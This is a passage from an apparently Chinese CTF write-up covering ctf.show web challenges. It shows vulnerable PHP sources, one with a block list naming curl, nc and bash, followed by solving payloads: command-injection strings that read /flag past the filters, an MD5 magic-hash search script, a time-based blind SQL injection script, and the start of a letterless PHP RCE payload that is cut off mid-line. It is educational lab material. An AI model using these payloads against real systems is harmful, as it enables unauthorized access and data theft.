punctuation\">(</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"sort\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"curl\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nc\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"bash\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"快到非洲了\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"去非洲吧\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><strong>首先绕过第一个正则</strong></p>\n<p>要为只由数字、点、横杠组成，同时正反序 intval 的值相同，并且不为回文字符串</p>\n<p>这里有两种构造方法</p>\n<p>一是利用浮点数的精度 如 <code>100.0010100.0010</code></p>\n<p>二是利用 <code>inval</code>  的特性截断，如 <code>.11.-.11.−</code></p>\n<p><strong>其次是要绕过 md5</strong></p>\n<p>这里用了 md5 碰撞，脚本如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    num <span class=\"token operator\">=</span> <span class=\"token string\">'0e'</span> <span class=\"token operator\">+</span> i</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    md5 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    md5 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>md5<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\"># print(md5)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> md5<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'0e'</span> <span class=\"token keyword\">and</span> md5<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>isdigit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> md5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">1000000</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>之后 get_flag 可以使用 <code>\\</code>  绕过，可以用  <code>%09</code>  绕过空格</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?get_flag&#x3D;ca\\t&lt;&#x2F;flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?get_flag&#x3D;ca\\t%09&#x2F;flag</pre></td></tr></table></figure><p>或者也可以使用 nl 写文件</p>\n<h2 id=\"wustctf_朴实无华_revenge_revenge\"><a class=\"anchor\" href=\"#wustctf_朴实无华_revenge_revenge\">#</a> WUSTCTF_朴实无华_Revenge_Revenge</h2>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?num&#x3D;0.00&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ta\\c%09flag.p\\hp</pre></td></tr></table></figure><h2 id=\"login_only_for_36d\"><a class=\"anchor\" href=\"#login_only_for_36d\">#</a> Login_Only_For_36D</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://621b1844-7d0d-4d4b-b5db-e3dbbccc3b68.challenge.ctf.show/\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ans <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> mid <span class=\"token keyword\">in</span> <span class=\"token string\">\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token string\">\"username\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"admin\\\\\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token string\">\"password\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'or/**/if((password/**/regexp/**/binary/**/\"^&#123;&#125;\"),sleep(10),1)#'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ans<span class=\"token operator\">+</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\"># 请求</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            ans <span class=\"token operator\">+=</span> mid</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>过滤了 <code>'=</code>  空格</p>\n<p><code>regexp</code>  注入，时间盲注</p>\n<p>得到密码 <code>ILoVeThlrtySixD</code></p>\n<h2 id=\"你取吧\"><a class=\"anchor\" href=\"#你取吧\">#</a> 你取吧</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$hint</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=hhh.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'g'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'h'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'i'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'j'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'k'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'m'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'q'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'v'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'z'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\~'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_merge</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blacklisted</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$blacklisted</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/im'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"echo(<span class=\"token interpolation\"><span class=\"token variable\">$code</span></span>);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"无字母-rce\"><a class=\"anchor\" href=\"#无字母-rce\">#</a> 无字母 rce</h3>\n<h4 id=\"p-神-payload\"><a class=\"anchor\" href=\"#p-神-payload\">#</a> p 神 payload</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span>@<span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$_</span></span>\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// $_='Array';</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'!'</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'@'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// $_=$_[0];</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// A</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// S</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// S</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// E </span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// R</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// T</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$____</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// P</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span 